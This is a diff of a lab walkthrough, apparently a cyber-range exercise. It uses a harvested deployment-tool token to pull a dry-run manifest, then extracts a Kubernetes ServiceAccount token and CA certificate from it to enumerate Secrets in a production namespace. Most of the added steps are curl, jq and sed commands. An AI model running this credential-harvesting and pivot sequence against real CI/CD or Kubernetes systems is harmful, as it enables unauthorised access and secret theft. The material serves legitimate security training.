@@ -18,7 +18,9 @@ Use the Deploy Commander token retrieved from M4 to list applications and reques
 | Deploy Commander | `203.0.3.36:8888` |
 | API token source | `$RANGE3_DIR/sonar-settings.json` |
 | Application | `pul-ota-firmware` |
-| Reported cluster | `193.x.x.x:6443` (placeholder) |
+| Kubernetes API | `203.0.2.188:6443` |
+| Namespace | `pul-production` |
+| API access | Restricted to the lab Kali source and Deploy Commander host |
 
 ## Step-by-Step Exploitation
 
@@ -26,8 +28,10 @@ Use the Deploy Commander token retrieved from M4 to list applications and reques
 
 ```bash
 DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
-curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications \
-     -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
+```
+
+```bash
+curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
 ```
 <img width="1288" height="636" alt="WindowsTerminal_EQqYv6AdM0" src="https://github.com/user-attachments/assets/6c61c6bb-5934-4bac-8c68-a87a28dd7553" />
 
@@ -36,28 +40,66 @@ The response includes `pul-ota-firmware`.
 ### Step 2 — Request a dry-run manifest
 
 ```bash
-curl --max-time 8 -fsS -X POST \
-     "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
-     -H "Authorization: Bearer ${DEPLOY_TOKEN}" \
-     -o "$RANGE3_DIR/dryrun.json"
+umask 077
+```
+
+```bash
+curl --max-time 8 -fsS -X POST "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" -H "Authorization: Bearer ${DEPLOY_TOKEN}" -o "$RANGE3_DIR/dryrun.json"
+```
+
+```bash
 jq '{result, warning, manifest_present: (.manifest != null)}' "$RANGE3_DIR/dryrun.json"
 ```
 <img width="1307" height="220" alt="WindowsTerminal_n8FMa62C5h" src="https://github.com/user-attachments/assets/c14f2f6e-e498-418c-a92e-1505c37781e7" />
 
-The API returned a dry-run manifest. No sync was applied to a cluster.
+The API returns the manifest without applying the Deployment. The manifest now points to the provisioned Kubernetes API at `203.0.2.188:6443` and the deployed registry at `203.0.3.36:5000`.
 
-### Step 3 — Inspect the manifest without printing token data
+### Step 3 — Extract the cluster connection data
 
 ```bash
 jq -r '.manifest' "$RANGE3_DIR/dryrun.json" | grep -E 'kind: Secret|cluster_endpoint:|namespace:' | sed -E 's/(token:).*/\1 <redacted>/'
 ```
 <img width="1260" height="207" alt="WindowsTerminal_5lvI1o86M5" src="https://github.com/user-attachments/assets/31f24937-bf30-47b7-a11c-2a476acc7111" />
 
-The manifest contains a ServiceAccount Secret and reports `https://193.x.x.x:6443`. That address is a placeholder, not a validated cluster endpoint.
+Keep using the same terminal. The following commands extract the endpoint and the base64-encoded ServiceAccount token and CA certificate without printing their values.
 
-### Step 4 — Cluster pivot status
+```bash
+M5_MANIFEST="$(jq -r '.manifest' "$RANGE3_DIR/dryrun.json")"
+```
 
-The repository does not include RNG-CLD-01 provisioning or a real cluster address. The M5 Deploy Commander service and dry-run API work, but the Kubernetes pivot cannot be completed from the provided files. Do not use the placeholder kubeconfig or disable TLS verification.
+```bash
+CLUSTER_ENDPOINT="$(printf '%s\n' "$M5_MANIFEST" | sed -n 's/^  cluster_endpoint: "\([^"]*\)"/\1/p')"
+```
+
+```bash
+SA_TOKEN_B64="$(printf '%s\n' "$M5_MANIFEST" | sed -n '/^data:/,/^---/s/^  token: //p')"
+```
+
+```bash
+CLUSTER_CA_B64="$(printf '%s\n' "$M5_MANIFEST" | sed -n '/^data:/,/^---/s/^  ca.crt: //p')"
+```
+
+```bash
+SA_TOKEN="$(printf '%s' "$SA_TOKEN_B64" | base64 -d)"
+```
+
+### Step 4 — Query the Kubernetes namespace
+
+The ServiceAccount is limited to reading Pods, Deployments, Services, ConfigMaps, and Secrets in `pul-production`.
+
+```bash
+curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/secrets" | jq -r '.items[].metadata.name'
+```
+
+The current setup returns `pul-ota-deployer-token`. A cluster-wide Secret list is denied:
+
+```bash
+curl --max-time 8 -sS -o /dev/null -w 'Cluster-wide secret list HTTP %{http_code}\n' --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/secrets"
+```
+
+Expected status: `403`. The API certificate is verified against the CA from the manifest; do not disable TLS verification. The Kubernetes API firewall allows the observed Kali source and the Deploy Commander host, and drops other sources.
+
+The cluster is a single-node K3s lab instance. The dry-run remains non-mutating; no firmware Deployment is applied by these commands.
 
 ## MITRE ATT&CK Mapping
 
@@ -73,6 +115,16 @@ After completing the lab steps, remove the downloaded files and clear the shell 
 
 ```bash
 rm -f "$RANGE3_DIR/docker-config.json" "$RANGE3_DIR/registry-config.json" "$RANGE3_DIR/sonarqube-access.env" "$RANGE3_DIR/sonar-settings.json" "$RANGE3_DIR/dryrun.json"
+```
+
+```bash
 rmdir "$RANGE3_DIR"
+```
+
+```bash
 unset REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE MINIO_ACCESS_KEY MINIO_SECRET_KEY DEPLOY_TOKEN RANGE3_DIR
+```
+
+```bash
+unset M5_MANIFEST CLUSTER_ENDPOINT SA_TOKEN_B64 CLUSTER_CA_B64 SA_TOKEN
 ```
